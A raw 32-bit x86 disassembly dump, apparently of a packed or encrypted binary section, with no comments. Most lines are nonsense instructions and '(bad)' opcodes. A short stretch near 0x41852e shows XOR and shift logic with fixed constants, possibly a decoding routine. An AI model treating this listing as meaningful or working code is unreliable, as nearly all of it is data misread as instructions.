  4182ad:	jmp    0xbc5b39e6
  4182b2:	sbb    eax,DWORD PTR [ecx-0x30]
  4182b5:	cs test al,0xf
  4182b8:	(bad)  
  4182ba:	jae    0x41823c
  4182bc:	cld    
  4182bd:	xchg   BYTE PTR [eax],cl
  4182bf:	or     ebp,0xffffff8d
  4182c2:	xchg   edx,eax
  4182c3:	mov    bl,BYTE PTR [esi+0x78]
  4182c6:	mov    al,0xf1
  4182c8:	and    esi,DWORD PTR [eax]
  4182ca:	mov    bh,0x70
  4182cc:	das    
  4182cd:	push   esi
  4182ce:	cmp    DWORD PTR [edx+0x465952c8],eax
  4182d4:	sub    BYTE PTR [ecx-0x63b7b1ee],0x55
  4182db:	add    DWORD PTR [ebp+0x7],ecx
  4182de:	leave  
  4182df:	xchg   ecx,eax
  4182e0:	jmp    0x6eb:0x5c26b6fc
  4182e7:	add    ch,BYTE PTR [eax*8-0x942e420]
  4182ee:	stos   DWORD PTR es:[edi],eax
  4182ef:	clc    
  4182f0:	scas   al,BYTE PTR es:[edi]
  4182f1:	sbb    BYTE PTR [esi],ch
  4182f3:	sbb    ch,BYTE PTR [edx]
  4182f5:	mov    dh,0xe3
  4182f7:	jae    0x4182b6
  4182f9:	pop    es
  4182fa:	pop    ebp
  4182fb:	pop    edx
  4182fc:	sbb    ah,dl
  4182fe:	add    ch,BYTE PTR [edx+0x55]
  418301:	adc    DWORD PTR [ebx],esi
  418303:	loopne 0x4182a2
  418305:	xor    eax,0x95e5577c
  41830a:	cmp    eax,0xf58fbbd3
  41830f:	arpl   WORD PTR [edi+0x52],sp
  418312:	int    0xfc
  418314:	push   es
  418315:	mov    ah,0x83
  418317:	loopne 0x418325
  418319:	test   eax,0x77e64dfd
  41831e:	cwde   
  41831f:	jmp    0x27087f63
  418324:	faddp  st(0),st
  418326:	das    
  418327:	das    
  418328:	and    dl,dh
  41832a:	cld    
  41832b:	popa   
  41832c:	out    0x18,eax
  41832e:	fild   WORD PTR [edx+0x79]
  418331:	rcl    BYTE PTR [esi],0xda
  418334:	(bad)  
  418335:	call   0x234a:0xeebc3026
  41833c:	enter  0x3e5d,0x8
  418340:	mov    dh,bl
  418342:	push   edx
  418343:	mov    edi,0x2f2828ce
  418348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418349:	dec    edi
  41834a:	mov    ebx,0x3c5db871
  41834f:	ds cmp al,0x4a
  418352:	sub    DWORD PTR [edi+0x3d],ecx
  418355:	mov    esp,ebx
  418357:	inc    eax
  418358:	jne    0x41833d
  41835a:	call   0xfaf097ee
  41835f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418360:	push   ebx
  418361:	mov    esi,0xe0f964d7
  418366:	jg     0x4183a9
  418368:	inc    esi
  418369:	cmp    cl,BYTE PTR [edx+esi*1-0x48]
  41836d:	sbb    dl,BYTE PTR [ecx]
  41836f:	add    dl,BYTE PTR [eax+0x34]
  418372:	jle    0x4183ae
  418374:	ss pop edx
  418376:	daa    
  418377:	pop    eax
  418378:	push   0x9a86bce1
  41837d:	(bad)  
  41837e:	sti    
  41837f:	sahf   
  418380:	test   eax,0x9f11d673
  418385:	inc    esi
  418386:	arpl   WORD PTR [ebx],bx
  418388:	sub    eax,0x882c21d4
  41838d:	mov    bh,0xd1
  41838f:	cmp    al,0x1b
  418391:	daa    
  418392:	inc    eax
  418393:	addr16 lahf 
  418395:	jl     0x4183a8
  418397:	cmc    
  418398:	inc    eax
  418399:	in     al,0xff
  41839b:	dec    ebx
  41839c:	xor    BYTE PTR [esi+0x74],cl
  41839f:	cmp    BYTE PTR [esi],bh
  4183a1:	inc    edi
  4183a2:	ja     0x418327
  4183a4:	inc    ecx
  4183a5:	imul   DWORD PTR [edi+0x24]
  4183a8:	jmp    0x418395
  4183aa:	push   cs
  4183ab:	aam    0x76
  4183ad:	mov    dl,0x26
  4183af:	data16 sbb al,0x4c
  4183b2:	jno    0x41837e
  4183b4:	and    al,0xbb
  4183b6:	sti    
  4183b7:	jmp    0xca048c9
  4183bc:	fs inc esi
  4183be:	ins    DWORD PTR es:[edi],dx
  4183bf:	mov    BYTE PTR [ecx],bl
  4183c1:	and    edx,DWORD PTR [edx-0x5]
  4183c4:	(bad)  
  4183c5:	push   eax
  4183c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183c7:	sar    esi,0xcf
  4183ca:	cld    
  4183cb:	in     eax,0x15
  4183cd:	mov    ch,0xa3
  4183cf:	shl    DWORD PTR cs:[edi],1
  4183d2:	or     eax,0xa53f9011
  4183d7:	jmp    0x418421
  4183d9:	enter  0xb27b,0x15
  4183dd:	mov    cs,WORD PTR [esi+esi*8]
  4183e0:	adc    al,0x83
  4183e2:	xchg   ecx,ebx
  4183e4:	int3   
  4183e5:	jo     0x418453
  4183e7:	addr16 test al,0xc4
  4183ea:	mov    bh,0x78
  4183ec:	push   esi
  4183ed:	sbb    edx,eax
  4183ef:	jb     0x418373
  4183f1:	das    
  4183f2:	dec    edi
  4183f3:	and    eax,0xffffff9c
  4183f6:	mov    edx,0x903991af
  4183fb:	loope  0x418389
  4183fd:	popa   
  4183fe:	pop    ebp
  4183ff:	loop   0x4183f1
  418401:	cwde   
  418402:	inc    esp
  418403:	or     BYTE PTR [eax-0x2591def4],bh
  418409:	cdq    
  41840a:	sbb    al,BYTE PTR [ebx+0x42e5e74e]
  418410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418411:	js     0x41847e
  418413:	addr16 jae 0x4183dd
  418416:	sti    
  418417:	ret    
  418418:	popa   
  418419:	jmp    0x418403
  41841b:	inc    esi
  41841c:	rcr    BYTE PTR [edi],1
  41841e:	mov    ebx,DWORD PTR [eax+0x201da8c8]
  418424:	xor    eax,esp
  418426:	fiadd  DWORD PTR [ebp-0xd]
  418429:	lea    bx,[ecx]
  41842c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41842d:	test   eax,0xb2698d8
  418432:	in     eax,0xcb
  418434:	dec    ebx
  418435:	out    dx,eax
  418436:	mov    al,0xa8
  418438:	in     eax,dx
  418439:	fstp   st(0)
  41843b:	stc    
  41843c:	rcr    DWORD PTR [ebp-0x57],cl
  41843f:	or     eax,0x6b0af2f7
  418444:	pop    eax
  418445:	test   eax,0x460a0555
  41844a:	mov    BYTE PTR ds:0x619bd7cc,dh
  418450:	add    DWORD PTR [ecx],0xbee7a678
  418456:	dec    ebp
  418457:	pusha  
  418458:	inc    ecx
  418459:	lock dec ebx
  41845b:	jns    0x4183e7
  41845d:	adc    DWORD PTR [ebx-0x6],edx
  418460:	out    0x7d,al
  418462:	pop    ss
  418463:	push   ebp
  418464:	jne    0x4184c7
  418466:	pop    ds
  418467:	fsubr  DWORD PTR [eax+0x69]
  41846a:	test   eax,0x42dfc512
  41846f:	cmp    ebx,DWORD PTR [ecx]
  418471:	push   edx
  418472:	ret    0x94f8
  418475:	jne    0x418438
  418477:	pop    ebp
  418478:	jo     0x418406
  41847a:	mov    edi,DWORD PTR [ebp-0x6edf846a]
  418480:	daa    
  418481:	xchg   DWORD PTR [esi+0x667071ab],ecx
  418487:	jns    0x41844e
  418489:	ror    dl,cl
  41848b:	mov    eax,ds:0x536a2ab8
  418490:	jecxz  0x4184a5
  418492:	mov    ds:0x76956ef3,eax
  418497:	leave  
  418498:	frndint 
  41849a:	xchg   ch,bl
  41849c:	inc    esp
  41849d:	lea    esp,[edx+0x24]
  4184a0:	das    
  4184a1:	test   al,0x37
  4184a3:	test   al,0x4e
  4184a5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a7:	sbb    al,0x6d
  4184a9:	mov    bh,al
  4184ab:	cdq    
  4184ac:	adc    edi,ecx
  4184ae:	in     al,dx
  4184af:	mov    al,0x93
  4184b1:	mov    al,ds:0xc82049cd
  4184b6:	fbld   TBYTE PTR [esi-0x5fde95a]
  4184bc:	sub    edx,DWORD PTR [esi]
  4184be:	mov    esi,0xf72d1290
  4184c3:	aaa    
  4184c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c5:	sbb    al,0x43
  4184c7:	and    edx,DWORD PTR [ebp+edx*4+0x55d89f7c]
  4184ce:	gs dec eax
  4184d0:	and    eax,0x5cf6a60e
  4184d5:	sbb    DWORD PTR [esi],ebp
  4184d7:	sahf   
  4184d8:	jmp    0x54a1:0x1569ae7c
  4184df:	pop    es
  4184e0:	sbb    BYTE PTR [ecx+0x55d5dc41],ch
  4184e6:	aaa    
  4184e7:	dec    esi
  4184e8:	dec    esp
  4184e9:	mov    bl,0xd6
  4184eb:	and    eax,0xa1858a4d
  4184f0:	xor    bl,BYTE PTR [ecx]
  4184f2:	add    cl,BYTE PTR [ebp+eax*4+0x28863ad1]
  4184f9:	jno    0x418547
  4184fb:	je     0x418486
  4184fd:	mov    eax,0xf2308950
  418502:	push   0xffffffef
  418504:	sbb    bh,BYTE PTR [ebp+0x51]
  418507:	mov    bl,ch
  418509:	sub    ch,BYTE PTR [ebp+0x50df0ec7]
  41850f:	push   ebx
  418510:	adc    BYTE PTR [edx+0x69c1262c],al
  418516:	pop    edi
  418517:	pop    ss
  418518:	pop    es
  418519:	fistp  DWORD PTR [esi+0x340ec344]
  41851f:	dec    ebp
  418520:	xchg   ecx,eax
  418521:	out    dx,al
  418522:	scas   al,BYTE PTR es:[edi]
  418523:	imul   esi,DWORD PTR [edx+eax*2+0x65a08e69],0x7bf58d57
  41852e:	daa    
  41852f:	mov    ecx,eax
  418531:	or     ecx,DWORD PTR [ebp+0x10]
  418534:	xor    eax,eax
  418536:	or     edx,eax
  418538:	xor    ecx,0xba699573
  41853e:	xor    edx,0x9c0a89d8
  418544:	mov    DWORD PTR [esi],ecx
  418546:	mov    DWORD PTR [esi+0x4],edx
  418549:	mov    eax,0xc0000000
  41854e:	mov    ecx,DWORD PTR [esi]
  418550:	mov    edx,DWORD PTR [esi+0x4]
  418553:	mov    edx,ecx
  418555:	shl    edx,0x1e
  418558:	xor    edx,eax
  41855a:	mov    DWORD PTR [ebp+0x14],edx
  41855d:	mov    edx,DWORD PTR [esi]
  41855f:	mov    edi,DWORD PTR [esi+0x4]
  418562:	xor    edi,0x9c0a89d8
  418568:	xor    edx,0xba699573
  41856e:	shrd   edx,edi,0x2
  418572:	shr    edi,0x2
  418575:	or     edi,DWORD PTR [ebp+0x14]
  418578:	xor    ecx,ecx
  41857a:	mov    DWORD PTR [ebp+0xc],edi
  41857d:	or     edx,ecx
  41857f:	mov    ecx,DWORD PTR [ebx]
  418581:	mov    edi,DWORD PTR [ebx+0x4]
  418584:	mov    edi,ecx
  418586:	shl    edi,0x1e
  418589:	xor    edi,eax
  41858b:	mov    eax,DWORD PTR [ebx]
  41858d:	mov    DWORD PTR [ebp+0x14],edi
  418590:	mov    edi,DWORD PTR [ebx+0x4]
  418593:	jmp    0x418b1d
  418598:	test   DWORD PTR [ebx+0x38127d46],0xa0bf58ac
  4185a2:	mov    edx,0x5a606ae
  4185a7:	test   al,0x68
  4185a9:	outs   dx,DWORD PTR ds:[esi]
  4185aa:	or     al,0x16
  4185ac:	cmp    eax,0x98161604
  4185b1:	adc    esi,DWORD PTR [esi]
  4185b3:	adc    eax,0x6a128af1
  4185b8:	cmp    BYTE PTR [edi+ebp*1+0x41],al
  4185bc:	dec    edi
  4185bd:	fwait
  4185be:	iret   
  4185bf:	mov    esi,0xa11a0847
  4185c4:	call   0xf942bdda
  4185c9:	sahf   
  4185ca:	dec    ebx
  4185cb:	icebp  
  4185cc:	or     al,0x33
  4185ce:	mov    edx,0xb45f2d9b
  4185d3:	cld    
  4185d4:	push   0x9c4ab9ce
  4185d9:	add    DWORD PTR [edx+eiz*2-0x6e],ecx
  4185dd:	pop    ecx
  4185de:	push   cs
  4185df:	into   
  4185e0:	sbb    dl,BYTE PTR [ecx-0x68]
  4185e3:	jmp    0x4185f8
  4185e5:	push   cs
  4185e6:	jne    0x4185cd
  4185e8:	out    dx,al
  4185e9:	sbb    al,0x56
  4185eb:	cli    
  4185ec:	mov    esp,0x1749cff9
  4185f1:	and    BYTE PTR [edi],0x5
  4185f4:	sbb    BYTE PTR [esi+0x27732f37],bh
  4185fa:	mov    ?,ebp
  4185fc:	div    BYTE PTR [ebx-0x519dd0c9]
  418602:	mov    al,BYTE PTR [ecx]
  418604:	push   ebp
  418605:	xor    al,0xa0
  418607:	fistp  DWORD PTR [edi-0x5885c949]
  41860d:	loop   0x418641
  41860f:	jmp    0x4264c11f
  418614:	retf   0xb32d
  418617:	ret    
  418618:	retf   0x2fd1
  41861b:	or     al,0x71
  41861d:	fwait
  41861e:	leave  
  41861f:	pop    ss
  418620:	sub    al,0x10
  418622:	push   ecx
  418623:	idiv   ecx
  418625:	loopne 0x4185b0
  418627:	rol    DWORD PTR [ebp-0x5d42982e],0xe2
  41862e:	push   esi
  41862f:	push   edi
  418630:	add    al,0x23
  418632:	imul   esp,DWORD PTR [eax],0x67
  418635:	out    0x63,al
  418637:	jnp    0x418651
  418639:	clc    
  41863a:	sub    DWORD PTR [edi+0x5d],esi
  41863d:	paddw  mm6,QWORD PTR [eax+0x38c635d]
  418644:	or     DWORD PTR [esi-0x68b4df54],eax
  41864a:	push   ss
  41864b:	xor    esi,DWORD PTR [esi]
  41864d:	sub    DWORD PTR [ebp+0x26],ecx
  418650:	das    
  418651:	and    BYTE PTR [ebp+0x7ea09a78],ah
  418657:	mov    bl,bl
  418659:	cmp    DWORD PTR [ecx],eax
  41865b:	icebp  
  41865c:	mov    ch,0x29
  41865e:	aas    
  41865f:	jp     0x418687
  418661:	(bad)  
  418662:	jle    0x418608
  418664:	cmp    esp,DWORD PTR [eax-0x2eddf905]
  41866a:	sub    eax,0x4d09e16a
  41866f:	xchg   ebx,eax
  418670:	loopne 0x418618
  418672:	arpl   di,dx
  418674:	inc    BYTE PTR [edx+0x346b083c]
  41867a:	mov    al,0x72
  41867c:	arpl   WORD PTR [edx+0x4bad7be1],ax
  418682:	or     al,0x71
  418684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418685:	jmp    0xcb96:0x16b06fdf
  41868c:	adc    DWORD PTR ds:[ebp-0x1795a65c],edi
  418693:	push   DWORD PTR [ecx]
  418695:	ins    DWORD PTR es:[edi],dx
  418696:	ja     0x4186f3
  418698:	and    ebp,esi
  41869a:	loopne 0x4186f4
  41869c:	mov    dl,0x49
  41869e:	ret    0x521a
  4186a1:	aaa    
  4186a2:	jno    0x41863b
  4186a4:	mov    esi,0x51f456c5
  4186a9:	daa    
  4186aa:	jnp    0x418632
  4186ac:	mov    eax,ds:0x9428d356
  4186b1:	add    edx,ecx
  4186b3:	xchg   edi,eax
  4186b4:	clc    
  4186b5:	cmp    BYTE PTR [ebp-0x4fbc792a],ah
  4186bb:	sub    eax,0x889ff4af
  4186c0:	lods   eax,DWORD PTR ds:[esi]
  4186c1:	inc    ecx
  4186c2:	jge    0x4186ac
  4186c4:	in     eax,0x32
  4186c6:	add    eax,0xc8ac665e
  4186cb:	ins    DWORD PTR es:[edi],dx
  4186cc:	test   DWORD PTR ds:0x1a111edb,ebx
  4186d2:	mov    esp,0xe841c7df
  4186d7:	dec    ebx
  4186d8:	sbb    eax,DWORD PTR [eax+0x78]
  4186db:	xor    al,0x3
  4186dd:	lods   eax,DWORD PTR ds:[esi]
  4186de:	xor    eax,0x5e946c54
  4186e3:	xchg   edi,eax
  4186e4:	mov    edx,0x9c5da6f1
  4186e9:	imul   BYTE PTR [eax-0x31]
  4186ec:	stc    
  4186ed:	(bad)  
  4186ee:	jmp    0x48bc:0xa44e681c
  4186f5:	push   edx
  4186f6:	xchg   edx,eax
  4186f7:	sahf   
  4186f8:	add    ebp,ebx
  4186fa:	test   DWORD PTR [edi],ebx
  4186fc:	mov    ecx,0xa5aa0ee6
  418701:	and    BYTE PTR [esi+0x4d],dh
  418704:	out    dx,eax
  418705:	leave  
  418706:	js     0x41875d
  418708:	or     DWORD PTR [edi-0x4150c70c],0x68
  41870f:	retf   0xc1ce
  418712:	loope  0x418736
  418714:	and    ecx,eax
  418716:	adc    ah,bh
  418718:	xchg   edx,eax
  418719:	les    esi,FWORD PTR [ebp+0x45]
  41871c:	xchg   esp,eax
  41871d:	enter  0xf44,0x3c
  418721:	jbe    0x418726
  418723:	ror    BYTE PTR [edx],0x25
  418726:	sti    
  418727:	int3   
  418728:	xlat   BYTE PTR ds:[ebx]
  418729:	pop    ebp
  41872a:	pop    es
  41872b:	sbb    dl,BYTE PTR ds:0x3f005b2c
  418731:	ss inc ebp
  418733:	imul   esp,esp,0xffffffbd
  418736:	adc    al,0x8e
  418738:	ja     0x4186cc
  41873a:	lds    eax,FWORD PTR [ebx-0x2b]
  41873d:	sub    eax,esp
  41873f:	fmul   QWORD PTR [edi-0x1d49b7d8]
  418745:	cmp    al,0xf8
  418747:	inc    esi
  418748:	xchg   ebx,eax
  418749:	dec    edx
  41874a:	or     BYTE PTR [ecx],0xe6
  41874d:	jmp    0x5b4bccc5
  418752:	xchg   edi,eax
  418753:	call   0x36588f3a
  418758:	xchg   ah,al
  41875a:	stc    
  41875b:	(bad)  
  41875c:	(bad)  
  41875d:	jo     0x4186f4
  41875f:	test   al,0x1
  418761:	inc    ecx
  418762:	lds    ebx,FWORD PTR [esi+0x6b]
  418765:	mov    dh,0x3d
  418767:	mov    dl,0x6
  418769:	cmp    BYTE PTR [edi-0x21a560e9],cl
  41876f:	sbb    BYTE PTR [esi-0xeca7860],0x78
  418776:	mov    dh,0xba
  418778:	xchg   esi,eax
  418779:	mov    al,0x27
  41877b:	inc    ecx
  41877c:	int3   
  41877d:	and    BYTE PTR [ecx],0x5
  418780:	ja     0x418730
  418782:	hlt    
  418783:	mov    WORD PTR [ecx+ebx*1],?
  418786:	pop    esp
  418787:	xchg   esi,eax
  418788:	es xchg edi,eax
  41878a:	fbld   TBYTE PTR [edi-0x40db3103]
  418790:	iret   
  418791:	leave  
  418792:	fwait
  418793:	jmp    0xf99c2de4
  418798:	sti    
  418799:	ja     0x4187df
  41879b:	xor    dh,BYTE PTR [ebx+0x1b7925cd]
  4187a1:	dec    esp
  4187a2:	sub    dl,al
  4187a4:	sub    ebp,DWORD PTR ds:0x875434fb
  4187aa:	lds    eax,FWORD PTR [ebx]
  4187ac:	xchg   ebp,eax
  4187ad:	mov    ss,ecx
  4187af:	loopne 0x418762
  4187b1:	(bad)  
  4187b2:	mov    eax,ds:0x4a94f64c
  4187b7:	arpl   WORD PTR [ecx],dx
  4187b9:	adc    BYTE PTR [ecx],bl
  4187bb:	xchg   edx,eax
  4187bc:	mov    bh,0x34
  4187be:	outs   dx,BYTE PTR ds:[esi]
  4187bf:	pop    edi
  4187c0:	adc    BYTE PTR [eax-0x517e8e96],dl
  4187c6:	mov    edi,0x151fb46a
  4187cb:	push   0xad49a607
  4187d0:	and    bh,cl
  4187d2:	arpl   WORD PTR [esi-0x48],sp
  4187d5:	jecxz  0x418780
  4187d7:	enter  0xb018,0x1e
  4187db:	xor    DWORD PTR [ebx-0x15],ecx
  4187de:	stos   DWORD PTR es:[edi],eax
  4187df:	sbb    DWORD PTR [edx],ebx
  4187e1:	addr16 cmp eax,0x888c5ed6
  4187e7:	jge    0x41881e
  4187e9:	inc    esi
  4187ea:	inc    eax
  4187eb:	cli    
  4187ec:	sub    BYTE PTR [ecx+0x5f],dh
  4187ef:	and    dl,0x4e
  4187f2:	xlat   BYTE PTR ds:[ebx]
  4187f3:	jmp    0x418852
  4187f5:	mov    WORD PTR [ebp+eax*4+0x69],ds
  4187f9:	ins    DWORD PTR es:[edi],dx
  4187fa:	push   ecx
  4187fb:	out    0x92,eax
  4187fd:	add    cl,al
  4187ff:	mov    BYTE PTR [ecx-0x62b479c9],ah
  418805:	mov    ah,0x6f
  418807:	outs   dx,BYTE PTR ds:[esi]
  418808:	sub    eax,edx
  41880a:	jge    0x418792
  41880c:	add    ch,BYTE PTR [ebx]
  41880e:	jno    0x4187c2
  418810:	and    DWORD PTR [edx+0x38],esp
  418813:	mov    esp,0x720e5993
  418818:	dec    edx
  418819:	cmp    al,0x93
  41881b:	cmp    al,0xe1
  41881d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41881e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41881f:	fnsave [esp+ebp*8+0x71ab94bc]
  418826:	in     al,0xa5
  418828:	cmp    dl,ch
  41882a:	loop   0x418879
  41882c:	jmp    0xdf73e715
  418831:	jge    0x4187c1
  418833:	add    BYTE PTR [ebx],al
  418835:	sub    esp,esi
  418837:	and    ecx,ecx
  418839:	cmp    al,0x4a
  41883b:	rcr    BYTE PTR [ebx+0x6e],1
  41883e:	in     al,0x28
  418840:	jnp    0x4188c0
  418842:	cld    
  418843:	cli    
  418844:	je     0x418857
  418846:	outs   dx,DWORD PTR ds:[esi]
  418847:	call   0x11ce:0x1b5217a6
  41884e:	pop    ebx
  41884f:	sahf   
  418850:	shl    BYTE PTR [eax+0x7b],1
  418853:	ss jb  0x4187fa
  418856:	fadd   DWORD PTR [edi+0x26]
  418859:	cmp    al,BYTE PTR [edx+0x7219a4fa]
  41885f:	push   eax
  418860:	dec    edx
  418861:	std    
  418862:	jno    0x4187f2
  418864:	pop    esp
  418865:	hlt    
  418866:	mov    ch,0x2d
  418868:	pop    ecx
  418869:	sub    esp,ecx
  41886b:	mov    ecx,0x1e50c113
  418870:	adc    BYTE PTR [ebp-0x383b9e3c],al
  418876:	push   ds
  418877:	out    dx,al
  418878:	push   cs
  418879:	fs scas eax,DWORD PTR es:[edi]
  41887b:	fnstcw WORD PTR cs:[edx-0x754a04af]
  418882:	aam    0x1
  418884:	add    edi,ebp
  418886:	mov    ebx,0xde1f60d7
  41888b:	in     al,0xa7
  41888d:	and    BYTE PTR [ecx],dl
  41888f:	fs loope 0x4188c3
  418892:	lahf   
  418893:	inc    ebx
  418894:	ins    BYTE PTR es:[edi],dx
  418895:	and    eax,0x9896e46e
  41889a:	sbb    BYTE PTR [ebx+0x6ea286fb],al
  4188a0:	mov    bl,0x14
  4188a2:	jp     0x418859
  4188a4:	test   BYTE PTR [ebp+0x43c397bc],al
  4188aa:	scas   eax,DWORD PTR es:[edi]
  4188ab:	jmp    0xe48c:0x702163e8
  4188b2:	mov    bh,BYTE PTR [ecx-0x56]
  4188b5:	out    0x21,al
  4188b7:	sbb    ch,al
  4188b9:	retf   0x7688
  4188bc:	push   esp
  4188bd:	std    
  4188be:	out    0x5a,al
  4188c0:	out    dx,eax
  4188c1:	je     0x41891b
  4188c3:	or     ch,bh
  4188c5:	aas    
  4188c6:	xchg   esi,eax
  4188c7:	mov    bl,0x21
  4188c9:	enter  0xa6a2,0x5f
  4188cd:	clc    
  4188ce:	adc    cl,al
  4188d0:	lea    ecx,[ecx+0x79aa4fc9]
  4188d6:	in     eax,dx
  4188d7:	pop    edx
  4188d8:	shr    DWORD PTR [ecx+0x677aa290],0x36
  4188df:	sub    ch,dh
  4188e1:	popa   
  4188e2:	sub    BYTE PTR [ecx-0x70],ch
  4188e5:	add    esi,ecx
  4188e7:	retf   0xc2c1
  4188ea:	mov    al,0x6b
  4188ec:	add    BYTE PTR [edi-0x73],al
  4188ef:	sbb    DWORD PTR [edx+ebx*4-0x64],0xbf2c4274
  4188f7:	pop    es
  4188f8:	mov    al,0x97
  4188fa:	xchg   ecx,eax
  4188fb:	in     eax,0xd4
  4188fd:	cdq    
  4188fe:	jg     0x4188b3
  418900:	mul    DWORD PTR [ecx]
  418902:	push   0xd7334c8c
  418907:	jnp    0x4188c0
  418909:	dec    eax
  41890a:	sub    edi,DWORD PTR cs:[ecx+0x5c]
  41890e:	cmp    BYTE PTR [ebx+ebp*1+0x40],ch
  418912:	dec    esp
  418913:	jno    0x4188a5
  418915:	cmp    dl,BYTE PTR [edi]
  418917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418918:	ins    DWORD PTR es:[edi],dx
  418919:	or     al,0xaa
  41891b:	aas    
  41891c:	aaa    
  41891d:	mov    al,0x53
  41891f:	cmp    al,0x92
  418921:	scas   eax,DWORD PTR es:[edi]
  418922:	pop    ecx
  418923:	sbb    cl,BYTE PTR [edi+ebx*8]
  418926:	retf   0xda0f
  418929:	cs mov al,0x38
  41892c:	jle    0x418945
  41892e:	mov    ah,0xb5
  418930:	ins    BYTE PTR es:[edi],dx
  418931:	in     al,dx
  418932:	lds    eax,FWORD PTR [ebx]
  418934:	or     DWORD PTR [ebx+0x4],edi
  418937:	fcom   DWORD PTR ds:0xcfa7f700
  41893d:	addr16 dec ecx
  41893f:	jecxz  0x418911
  418941:	add    ecx,DWORD PTR [ebp+0x3f74e9b1]
  418947:	(bad)  
  418948:	out    0x42,eax
  41894a:	jne    0x4189a6
  41894c:	call   0x36582ee8
  418951:	ds out dx,al
  418953:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418954:	ss jg  0x4188e0
  418957:	or     DWORD PTR [edi],0xffffff8f
  41895a:	lods   al,BYTE PTR ds:[esi]
  41895b:	sub    BYTE PTR [ebx],bl
  41895d:	jb     0x418997
  41895f:	sbb    esp,DWORD PTR [edi+0x59b525c8]
  418965:	(bad)  
  418966:	ja     0x4189df
  418968:	cmp    bl,dh
  41896a:	jno    0x418974
  41896c:	gs retf 0x9aaf
  418970:	lahf   
  418971:	out    0xde,eax
  418973:	and    eax,0x6d4cea26
  418978:	cmp    BYTE PTR [ebx+edx*4-0x9],dh
  41897c:	dec    edi
  41897d:	xor    esp,DWORD PTR [esi+0x51f67f2e]
  418983:	add    DWORD PTR [ebx+eiz*2+0x2b],0xffffffdf
  418988:	mov    esp,0xa7c14e0e
  41898d:	not    DWORD PTR [ebx+0x77]
  418990:	iret   
  418991:	push   ebp
  418992:	xor    BYTE PTR [esi-0x60654207],0x19
  418999:	sub    ebp,DWORD PTR [ecx-0x4e]
  41899c:	popa   
  41899d:	dec    esp
  41899e:	lahf   
  41899f:	ds stc 
  4189a1:	and    eax,0x10d6d643
  4189a6:	dec    esp
  4189a7:	sti    
  4189a8:	cmp    edx,esi
  4189aa:	aam    0x99
  4189ac:	out    0xa0,eax
  4189ae:	cld    
  4189af:	and    ah,bh
  4189b1:	ret    0x2e8c
  4189b4:	sbb    DWORD PTR [edx],esi
  4189b6:	jle    0x41899b
  4189b8:	jns    0x418988
  4189ba:	arpl   bx,si
  4189bc:	hlt    
  4189bd:	cli    
  4189be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189bf:	cmp    eax,DWORD PTR [edx-0x35]
  4189c2:	test   DWORD PTR [eax],ebx
  4189c4:	scas   eax,DWORD PTR es:[edi]
  4189c5:	add    DWORD PTR [ebx],esi
  4189c7:	xor    dh,BYTE PTR [esi-0x335dff55]
  4189cd:	push   0x65aa720b
  4189d2:	(bad)  
  4189d3:	mov    esp,0x502b13e2
  4189d8:	or     DWORD PTR [bp-0x73],esi
  4189dc:	stc    
  4189dd:	outs   dx,BYTE PTR ds:[esi]
  4189de:	xchg   ecx,eax
  4189df:	(bad)  
  4189e0:	aam    0xc4
  4189e2:	jns    0x418a50
  4189e4:	cmp    ebx,ebp
  4189e6:	xor    al,0x1c
  4189e8:	stos   DWORD PTR es:[edi],eax
  4189e9:	aad    0x26
  4189eb:	mov    ah,0x97
  4189ed:	test   al,0xb1
  4189ef:	mov    ecx,0x9ef19f5d
  4189f4:	jb     0x418978
  4189f6:	jmp    0xdedb:0x6070088b
  4189fd:	push   ecx
  4189fe:	mov    ecx,DWORD PTR [esi]
  418a00:	mov    ebx,ebp
  418a02:	std    
  418a03:	stc    
  418a04:	sub    dh,BYTE PTR [eax+0x67]
  418a07:	lock outs dx,DWORD PTR ds:[esi]
  418a0a:	and    al,0xa2
  418a0c:	pusha  
  418a0d:	imul   ebp,esp,0xb0185f7c
  418a13:	addr16 adc dh,cl
  418a16:	fdivr  QWORD PTR [edi]
  418a18:	nop
  418a19:	(bad)  
  418a1a:	sub    al,0xff
  418a1c:	fwait
  418a1d:	push   ecx
  418a1e:	adc    eax,0x93653cd9
  418a23:	(bad)  
  418a24:	icebp  
  418a25:	(bad)  
  418a26:	fsub   st(4),st
  418a28:	std    
  418a29:	sar    ch,1
  418a2b:	inc    ecx
  418a2c:	int3   
  418a2d:	data16 jnp 0x418a7e
  418a30:	arpl   bx,cx
  418a32:	mov    bl,0x74
  418a34:	pusha  
  418a35:	arpl   sp,ax
  418a37:	data16 loop 0x418a5e
  418a3a:	adc    al,0xae
  418a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a3d:	call   0x8c51:0x78f344a4
  418a44:	lds    ebx,FWORD PTR [ecx+0x40b1ef7f]
  418a4a:	popf   
  418a4b:	in     al,0x8b
  418a4d:	aas    
  418a4e:	inc    ebp
  418a4f:	js     0x418a0e
  418a51:	xor    al,ch
  418a53:	adc    eax,0x8981ac8c
  418a58:	aam    0x4
  418a5a:	ja     0x418a4b
  418a5c:	mov    ch,0x68
  418a5e:	fucomip st,st(1)
  418a60:	push   esp
  418a61:	cli    
  418a62:	xchg   ebx,eax
  418a63:	dec    eax
  418a64:	into   
  418a65:	adc    BYTE PTR [ebp+0x116ed304],dh
  418a6b:	mov    WORD PTR [ecx-0x2ddb3226],ss
  418a71:	mov    eax,0x2f0481ab
  418a76:	cs leave 
  418a78:	call   0xcc469c1a
  418a7d:	add    al,0x8b
  418a7f:	cld    
  418a80:	dec    ebx
  418a81:	xchg   esp,eax
  418a82:	test   al,0xce
  418a84:	pusha  
  418a85:	cmc    
  418a86:	and    esi,DWORD PTR [edx+0x57187888]
  418a8c:	jl     0x418b05
  418a8e:	mov    bh,0xcf
  418a90:	repz and DWORD PTR [eax+0x43ef975],edi
